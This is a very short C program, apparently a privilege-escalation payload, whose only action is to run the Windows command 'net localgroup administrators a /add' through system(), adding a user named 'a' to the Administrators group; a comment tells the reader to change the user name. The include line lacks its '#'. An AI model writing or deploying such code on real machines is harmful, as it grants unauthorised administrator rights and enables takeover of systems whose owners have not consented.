include <stdlib.h>
int main(){
    int i;
    //add user a to admin group
    //u will change it
    i = system ("net localgroup administrators a /add");
    return 0;
}
